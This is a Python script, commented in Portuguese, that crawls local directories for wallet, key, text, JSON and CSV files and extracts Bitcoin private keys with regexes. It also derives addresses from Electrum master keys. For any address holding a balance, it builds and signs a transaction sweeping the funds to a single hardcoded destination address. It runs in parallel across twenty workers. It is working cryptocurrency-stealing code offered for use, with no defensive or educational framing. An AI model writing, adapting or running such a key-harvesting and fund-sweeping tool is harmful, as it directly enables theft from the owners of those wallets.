import json
import re
import os
import requests
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500 # Taxa agressiva para prioridade
        amount = balance_sats - fee
        if amount <= 546: return None
        
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except Exception as e:
        print(f"❌ Erro ao assinar: {e}")
        return None

def check_balance_and_broadcast(priv_key_str):
    try:
        # Tenta converter a string capturada em uma chave Bitcoin válida
        k = Key(priv_key_str, network='bitcoin')
        
        # Varre os 3 formatos principais de endereços
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            
            # LOG DE VARREDURA (Para você ver o script trabalhando)
            print(f"🔎 Verificando: {addr}...", end="\r")
            
            time.sleep(0.2) # Proteção contra bloqueio de IP
            try:
                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 1000:
                    print(f"\n🚨 !!! SALDO DETECTADO !!!")
                    print(f"Endereço: {addr} | Saldo: {bal} sats")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        print(f"HEX_GEN:{raw_hex}")
                        return True
            except: continue
    except: pass # Se a string não for uma chave válida, ignora silenciosamente
    return False

def process_file(file_path):
    print(f"\n📂 ANALISANDO ARQUIVO: {file_path}")
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Regex mais abrangente para capturar chaves privadas em qualquer lugar do texto
            # 1. WIF (Formatos L, K ou 5)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            # 2. HEX (64 caracteres hexadecimais)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            # 3. Tratamento para Electrum JSON
            if '"keystore"' in content:
                try:
                    data = json.loads(content)
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        print(f"📦 Detectada Master Key (xprv). Derivando 100 endereços...")
                        master = Key(data['keystore']['xprv'])
                        for i in range(100):
                            check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
                except: pass

            found_keys = list(set(wifs + hex_keys))
            print(f"🔑 Chaves encontradas no texto: {len(found_keys)}")
            
            for key in found_keys:
                check_balance_and_broadcast(key)
                
    except Exception as e:
        print(f"⚠️ Erro ao processar: {e}")

if __name__ == "__main__":
    exts = ('.wallet', '.txt', '.key', '.rtf', '.json', '.csv')
    all_files = []
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.lower().endswith(exts):
                all_files.append(os.path.join(root, f))
    
    all_files = sorted(list(set(all_files)))
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID}/{TOTAL_WORKERS} | ARQUIVOS NESTE LOTE: {len(my_files)}")
    for f in my_files:
        process_file(f)
